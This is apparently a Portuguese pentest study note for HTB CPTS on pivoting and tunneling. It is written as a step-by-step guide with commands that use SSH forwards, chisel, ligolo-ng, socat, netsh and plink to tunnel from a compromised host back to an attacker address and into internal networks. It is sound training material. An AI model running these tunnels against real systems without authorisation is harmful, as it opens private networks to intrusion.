---
tema: Pentest
tópico: Fase 08 — Pivoting e Tunneling
tags: [htb, cpts, fase, pivoting, tunneling, proxychains, chisel, ligolo, ssh]
dificuldade: medium
---

# 🕸️ Fase 08 — Pivoting e Tunneling

> [!info] Objetivo da fase
> Alcançar o que **não é roteável a partir da sua máquina**. Você comprometeu um host com duas interfaces e transformou ele em ponto de entrada para uma rede inteira que nunca apareceu no Nmap inicial. O objetivo é ter **um caminho estável** (túnel ou rota) comprovado por um scan através dele — não "a conexão ficou de pé".

## 🎯 Quando entrar

- O host comprometido tem interfaces ou rotas que você não alcança (`ip a`, `ip route`, `arp -a`, `route print`).
- Um scan a partir do host comprometido encontra hosts/serviços que o seu Nmap não via.
- Você achou na config/arquivo do alvo referências a faixas internas (`10.x`, `172.16-31.x`, `192.168.x`).
- Precisa levar ferramentas a um segundo host que só é alcançável via o primeiro.
- Active Directory com segmentação: DC e membros numa VLAN separada (Fase 09 depende disto).

## 📥 Pré-requisitos e inputs

| Input | Como obter |
|-------|-----------|
| Host pivô comprometido | Fases 06/07 |
| Interfaces e rotas do pivô | `ip a`, `ip route`, `route print`, `arp -a` |
| Redes internas descobertas | Scan a partir do pivô (`nmap` local, ou `nxc`, `fping`) |
| Capacidade de execução | Shell estável; idealmente com upload de binário |
| Porta de saída liberada | Teste egress do pivô para o seu IP |
| SSH válido (se existir) | Credencial ou chave do pivô |
| Binário de túnel no pivô | chisel/ligolo/socat, baixados na Fase 07 |

**Descobrir a topologia antes de montar qualquer túnel:**

```bash
# Linux
ip a; ip route; ip neigh; cat /etc/resolv.conf; cat /etc/hosts
# Windows
ipconfig /all; route print; arp -a; type C:\Windows\System32\drivers\etc\hosts
```

```bash
# Scan feito A PARTIR do pivô — usa o loopback dele como origem
nmap -sn 172.16.1.0/24                    # descoberta
nmap -sT -p 22,80,135,139,445,3389 172.16.1.0/24 --open -oA internal
```

> [!tip] Faça o scan a partir do pivô primeiro
> Depois de saber **o que existe**, você monta o túnel mínimo necessário (uma porta, uma sub-rede ou a faixa toda). Montar antes de saber é construir estrada para lugar nenhum.

## 🪜 Passo a passo

### 1. Classifique o problema

| Pergunta | Consequência |
|----------|--------------|
| Preciso de **uma porta** de um host interno? | Port forward (`ssh -L`, socat, netsh, portfwd) |
| Preciso de **muitas portas** de um host? | Forward por porta ou SOCKS |
| Preciso de **vários hosts** de uma sub-rede? | SOCKS/proxychains, chisel, ligolo, sshuttle |
| Preciso de **rede roteada** (ICMP, UDP, qualquer protocolo)? | ligolo-ng (TUN) ou sshuttle — proxychains não serve |
| Preciso **reverter** um serviço interno para o atacante? | `ssh -R`, chisel `R:`, socat, ligolo listener |
| O pivô não tem SSH e nem compilador? | chisel/ligolo estáticos (binário único) |

### 2. SSH local forward — uma porta para você

```bash
# Na SUA máquina: 8080 local -> 80 do host interno VISTO PELO PIVÔ
ssh -L 8080:172.16.1.10:80 <USUARIO>@<IP_PIVOT> -N -f

# -L  [bind:]porta_local:host_interno:porta_interna
# -N  não abre shell, só o túnel
# -f  vai para background
# Acesso agora: http://127.0.0.1:8080
```

**Ponto-chave:** o `host_interno` é resolvido **pelo pivô**, não por você. Pode ser `127.0.0.1` (serviço local do pivô) ou um IP interno.

### 3. SSH remote forward — o alvo inicia

```bash
# Do PIVÔ para você: expõe um serviço do pivô na SUA máquina
ssh -R 8080:127.0.0.1:80 <USUARIO>@<IP_ATACANTE> -N

# Caso clássico: pivô sem egress exceto SSH de saída,
# e você quer ler o serviço interno dele em localhost:8080
```

Também serve para o inverso: expor um serviço **seu** (ex.: seu `nc` listener) para dentro da rede interna.

### 4. SSH dynamic — SOCKS5 para a rede inteira

```bash
# Cria um proxy SOCKS5 em 127.0.0.1:9050 que resolve tudo pelo pivô
ssh -D 9050 <USUARIO>@<IP_PIVOT> -N -f
```

### 5. proxychains — o cliente do SOCKS

```bash
# Configuração padrão
sudo tee /etc/proxychains.conf <<'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 9050
EOF

# Uso: qualquer comando TCP passa pelo proxy
proxychains curl http://172.16.1.10/
proxychains nxc smb 172.16.1.10 -u <USUARIO> -p <SENHA>
proxychains evil-winrm -i 172.16.1.10 -u <USUARIO> -p <SENHA>

# Config alternativa, sem tocar no global
proxychains -f ./pc.conf nmap -sT -Pn -n 172.16.1.10
```

**Limites duros do proxychains:** só TCP; sem ICMP (nada de `ping`, `-sn`); sem UDP (DNS/SMB sobre UDP, SNMP, DHCP quebram); `nmap` só funciona com `-sT`. Para varredura de rede real, use ligolo-ng.

### 6. chisel — túnel SOCKS/reverse sem SSH

```bash
# ATACANTE: servidor; --reverse permite que o cliente exponha portas na sua máquina
chisel server -p 8000 --reverse

# PIVÔ: conecta e cria um SOCKS5 na sua máquina em 127.0.0.1:1080
./chisel client <IP_ATACANTE>:8000 R:1080:socks

# PIVÔ: expõe uma porta específica de um host interno na sua máquina
./chisel client <IP_ATACANTE>:8000 R:8080:172.16.1.10:80
```

Depois é só apontar o proxychains para `socks5 127.0.0.1 1080`.

```bash
# Variante: chisel encadeado para um SEGUNDO pivot (duplo pivot)
# No pivô 1: sobe um servidor chisel
./chisel server -p 9000 --reverse
# No pivô 2 (só alcançável pelo pivô 1): conecta ao pivô 1
./chisel client 172.16.1.5:9000 R:1081:socks
# Agora o SOCKS 1081 existe no PIVÔ 1, que já está exposto pelo primeiro túnel.
```

### 7. ligolo-ng — a rede inteira roteada (melhor opção hoje)

```bash
# ATACANTE: cria a interface TUN (uma vez por boot)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# ATACANTE: sobe o proxy (escuta em 11601)
./proxy -selfcert -laddr 0.0.0.0:11601

# PIVÔ: agente conecta (nada de porta de escuta no pivô)
./agent -connect <IP_ATACANTE>:11601 -ignore-cert

# No console do proxy:
#   session            -> lista e seleciona a sessão
#   ifconfig           -> mostra as interfaces do pivô
#   start              -> ativa a interface TUN do agente
#   listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321   (reverse port forward)

# ATACANTE: adiciona a rota da rede interna pela interface ligolo
sudo ip route add 172.16.1.0/24 dev ligolo
# A partir daqui: nmap, ping, smb, rdp — TUDO funciona direto, sem proxy.
nmap -sS -p- 172.16.1.10
```

**Ligolo é superior a proxychains quando você precisa de ICMP/UDP/scans completos** — porque a interface TUN roda stack IP de verdade.

### 8. socat — relay minimalista, sem SSH e sem proxy

```bash
# NO PIVÔ: escuta na 8080 e repassa para o host interno
socat TCP-LISTEN:8080,fork,reuseaddr TCP:172.16.1.10:80
# Agora, da SUA máquina: http://<IP_PIVOT>:8080

# Reverse relay (pivô puxa para vocês dois)
socat TCP-LISTEN:9000,fork TCP:<IP_ATACANTE>:4444
```

`socat` é o canivete suíço: funciona para uma porta, sem autenticação e sem binário cliente. Ruim para muitas portas.

### 9. sshuttle — VPN so-sobre-SSH

```bash
# Roteia a sub-rede interna pelo SSH; precisa de root LOCAL e python no pivô
sshuttle -r <USUARIO>@<IP_PIVOT> 172.16.1.0/24

# Sem exigir root no pivô, com todas as faixas
sshuttle -r <USUARIO>@<IP_PIVOT> 172.16.1.0/24 10.10.0.0/16
```

Não usa proxy: cria regras de roteamento locais. Excelente para "trabalhar como se estivesse na rede", mas menos discreto.

### 10. Windows sem SSH — netsh portproxy e plink

```cmd
:: netsh portproxy: requer Administrador. Escuta na 8080 e repassa para o interno.
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=172.16.1.10 connectport=80

:: O firewall bloqueia por padrão: libere a porta de escuta
netsh advfirewall firewall add rule name="pivot8080" dir=in action=allow protocol=TCP localport=8080

:: Conferir e remover
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080
```

```cmd
:: plink (PuTTY) — SSH quando não existe cliente nativo
:: Reverse forward: expõe a 80 do host interno na SUA máquina:8080
plink.exe -ssh -l <USUARIO> -pw <SENHA> -R 8080:172.16.1.10:80 <IP_ATACANTE>

:: SOCKS dinâmico a partir do Windows
plink.exe -ssh -l <USUARIO> -pw <SENHA> -D 9050 <IP_ATACANTE> -N
```

> [!warning] plink pede confirmação de chave na primeira conexão
> A pergunta `Store key in cache? (y/n)` trava o shell não interativo. Responda com `echo y | plink.exe ...`. Ou use `-batch` (falha se a chave não estiver em cache).

### 11. Meterpreter — route e portfwd

```text
meterpreter > ipconfig
meterpreter > run post/multi/manage/autoroute SUBNET=172.16.1.0 NETMASK=255.255.255.0
meterpreter > portfwd add -l 8080 -p 80 -r 172.16.1.10
meterpreter > portfwd list

# SOCKS dentro do Metasploit (para usar proxychains junto)
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j

# Scanner pela rota estabelecida
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.1.0/24
msf6 auxiliary(scanner/portscan/tcp) > run
```

A rota do Meterpreter **morre junto com a sessão**. Se a sessão cair, refaça o autoroute.

### 12. Duplo pivot (encadear salto)

Situações reais têm camadas: você → host1 → host2 → rede final.

| Método | Como |
|--------|------|
| proxychains `strict_chain` | Duas entradas `socks5` (porta do primeiro e do segundo caminho) |
| chisel encadeado | Servidor chisel no pivô 1, cliente no pivô 2 com `R:1081:socks` |
| ligolo com agente relay | Agente no pivô 2 conecta passando pelo pivô 1 até o proxy |
| SSH `-J` (ProxyJump) | `ssh -J <USUARIO>@<PIVO1> <USUARIO>@<PIVO2>` compõe os saltos |
| Meterpreter route duplo | Sessão no host2, `autoroute` para a nova faixa |

```bash
# ProxyJump: encadeia dois saltos numa linha
ssh -J <USUARIO>@<IP_PIVOT1> <USUARIO>@<IP_PIVOT2> -D 9051 -N -f

# proxychains com dupla cadeia (encadeia dois SOCKS)
# [ProxyList]
# socks5 127.0.0.1 9050
# socks5 127.0.0.1 1080
```

> [!tip] Prefira proxy SOCKS + proxychains, não um forward por porta
> Cada `-L` novo é um processo para lembrar, um terminal ocupado e uma chance de erro. Um SOCKS cobre a rede toda; `ligolo` cobre tudo, inclusive ICMP/UDP.

### 13. Nmap através do túnel

```bash
# Via proxychains: SOMENTE -sT (connect scan). Sem SYN, sem ICMP, sem UDP.
proxychains nmap -sT -Pn -n -p 22,80,135,139,445,3389,5985 172.16.1.10

# Sem resolução DNS (-n) e sem ping (-Pn) — obrigatório pelo proxy
# Aumente o timeout se der "connection refused" espúrio:
proxychains nmap -sT -Pn -n -T4 --max-retries 2 -p- 172.16.1.10

# Via ligolo ou sshuttle: nmap completo, como se fosse rede local
nmap -sS -sV -p- 172.16.1.10
```

### 14. DNS e timeouts

| Sintoma | Causa | Correção |
|---------|-------|----------|
| Nomes não resolvem pelo proxy | DNS é UDP, não passa por SOCKS | Use IP; ou `proxy_dns` no proxychains; ou `-n` no nmap |
| Tudo dá timeout no proxychains | Timeout padrão curto demais | Suba `tcp_read_time_out` / `tcp_connect_time_out` |
| Proxychains "connection refused" em tudo | Proxy não está escutando na porta configurada | `ss -lntp \| grep <PORTA>` |
| Scan lentíssimo | 10 saltos de latência + scan sequencial | Reduza o alvo, use ligolo, ou aceite a lentidão |
| Nmap dá "unable to determine" | Scan SYN não suportado pelo SOCKS | Use `-sT` |
| Sessão cai após alguns minutos | Idle timeout do SSH/NAT | `ssh -o ServerAliveInterval=30`, `-o TCPKeepAlive=yes` |
| Fuso/hora errada nas evidências | Timezone do pivô diferente | Registre o fuso nos logs |

### 15. Erros comuns

- Esquecer `-N` no SSH e abrir shell em vez de túnel.
- `-L 8080:80` (faltando o host): a sintaxe exige `host:porta`.
- Confundir a perspectiva: `-L` resolve do lado do pivô, `-R` do lado de quem recebe.
- Bind em `127.0.0.1` no pivô quando o túnel precisa alcançar outra interface → use `0.0.0.0` **e** libere o firewall.
- `AllowTcpForwarding no` no `sshd_config` do pivô → `-L`/`-D` falham silenciosamente.
- Porta já em uso (`Address already in use`) → escolha outra ou mate o processo antigo.
- Meterpreter `portfwd`/`autoroute` perdidos ao cair a sessão.
- Deixar túnel ativo durante a limpeza → não remova o artefato que sustenta seu acesso antes da hora certa.
- Testar `proxychains ping` e concluir que o túnel está morto — ICMP não passa por SOCKS, nunca.

## 🧰 Ferramentas

| Ferramenta | O que faz | Quando usar |
|-----------|-----------|-------------|
| `ssh -L/-R/-D` | Forward local, remoto e SOCKS | Existe SSH e credencial/chave no pivô |
| `proxychains` | Encaminha comandos TCP por SOCKS | Consumir um SOCKS já criado |
| `chisel` | Túnel TCP/SOCKS sobre HTTP, sem depender de SSH | Pivô sem SSH, um único binário estático |
| `ligolo-ng` | Interface TUN: rede roteada de verdade | Scans completos, ICMP/UDP, muitos hosts |
| `socat` | Relay TCP simples | Expor uma porta rapidamente |
| `sshuttle` | VPN sobre SSH | Trabalhar na rede interna como se fosse local |
| `netsh portproxy` | Port forward no Windows | Pivô Windows sem ferramenta externa |
| `plink` | Cliente SSH no Windows | Windows sem OpenSSH, com PuTTY disponível |
| `meterpreter autoroute/portfwd` | Rotas e forwards dentro do MSF | Sessão Meterpreter disponível |
| `nxc`/`evil-winrm`/`impacket` | Acesso a serviços internos | Depois do túnel de pé |

## 🔀 Árvore de decisão

| Cenário | Técnica |
|---------|---------|
| Uma porta interna, acesso HTTP | `ssh -L 8080:host:80 -N -f` |
| Serviço do pivô precisa aparecer para você | `ssh -R` |
| Muitas portas, poucos hosts, só TCP | `ssh -D` + proxychains |
| Pivô sem SSH | chisel `R:socks` |
| Rede inteira, scan completo, ICMP/UDP | ligolo-ng |
| Windows sem SSH nem admin | chisel/ligolo (usuário comum já basta) |
| Windows admin, uma porta | `netsh portproxy` + regra de firewall |
| Windows com PuTTY | `plink -R` / `-D` |
| Sessão Meterpreter ativa | `autoroute` + `portfwd` |
| Encadear dois saltos | ProxyJump, chisel encadeado, duas entradas no proxychains |
| Egress do pivô bloqueado exceto 80/443 | chisel sobre 80/443, ligolo com `-ignore-cert` em porta permitida |
| Só DNS liberado | Túnel por DNS (dnscat2 / iodine) |
| Precisa de UDP (SNMP, DNS interno, DHCP) | ligolo-ng (proxychains **não** encaminha UDP) |
| Túnel cai com frequência | `ServerAliveInterval`, payload stageless, chisel com retry |
| Precisa de persistência do acesso | Reavalie: persistência só se autorizada no RoE |

## 📤 Evidências a registrar

- Topologia descoberta: interfaces, rotas e faixas de cada pivô (print de `ip a`/`ipconfig /all`).
- Scan interno executado **a partir** do pivô — prova de que os hosts existem.
- Comando exato de cada túnel, com portas e sentidos (`-L`, `R:`, `listener_add`).
- Prova de alcance: saída de um scan/comando pelo túnel (não basta "o túnel subiu").
- Hosts e serviços internos novos: IP, porta, versão, serviço.
- Diagrama do caminho: atacante → pivô1 → pivô2 → alvo final.
- Artefatos criados (chisel/ligolo no disco do pivô, regras netsh, rotas) — **para limpeza**.
- Timezone e timestamps de cada salto.

## 🕳️ Pegadinhas

> [!warning] O que quebra na prática
> - Rodar `nmap -sS` pelo proxychains: não funciona, SOCKS só faz connect scan.
> - `proxychains ping`: ICMP não passa por SOCKS. Nunca funcionou.
> - Esquecer `proxy_dns` e culpar o túnel por falha de resolução.
> - Túnel de pé mas firewall do pivô bloqueando a porta de escuta.
> - Bind em `127.0.0.1` no pivô quando o tráfego chega por outra interface.
> - `ssh -L` sem `-N`: abre shell e o túnel morre ao sair.
> - Perder a sessão Meterpreter e achar que a rota continua ativa.
> - Montar o pivô antes de saber a topologia — perde tempo tunelando a rede errada.
> - Deixar `nmap -p-` rodando por um SOCKS sobre dois saltos: leva horas.
> - Encadear proxychains esperando velocidade — cada salto multiplica a latência.
> - Não liberar a porta no firewall do Windows e concluir que o `netsh` falhou.
> - Entrar em loop de túneis: perde o rastro de qual terminal tem qual acesso. **Nomeie e anote cada túnel.**
> - Remover o binário do túnel no meio do engajamento e perder o acesso à rede interna.

## ✅ Checklist

- [ ] Interfaces, rotas e faixas do pivô documentadas
- [ ] Scan interno executado (a partir do pivô ou pelo túnel)
- [ ] Técnica escolhida de acordo com o cenário (tabela acima)
- [ ] Túnel/rota de pé, nomeado e anotado
- [ ] Alcance comprovado com um comando real (curl, nmap, ldapsearch)
- [ ] proxychains configurado (chain, proxy_dns, timeouts) se aplicável
- [ ] DNS: resolvendo por IP ou com `proxy_dns` funcionando
- [ ] Rotas do Windows/Linux adicionadas e testadas
- [ ] Duplo pivot planejado, se houver segundo salto
- [ ] Ferramentas de túnel presentes no pivô e registradas
- [ ] Artefatos e regras criadas listadas para limpeza
- [ ] Novo alvo interno devolvido para a Fase 03/04 com o túnel ativo

## 🔗 Relacionado

- [[Fase 07 - Shells e Transferência de Arquivos]]
- [[Fase 09 - Active Directory]]
- [[Fase 11 - Pós-Exploração]]
- [[CPTS 12 - Pivoting, Tunneling, and Port Forwarding]]
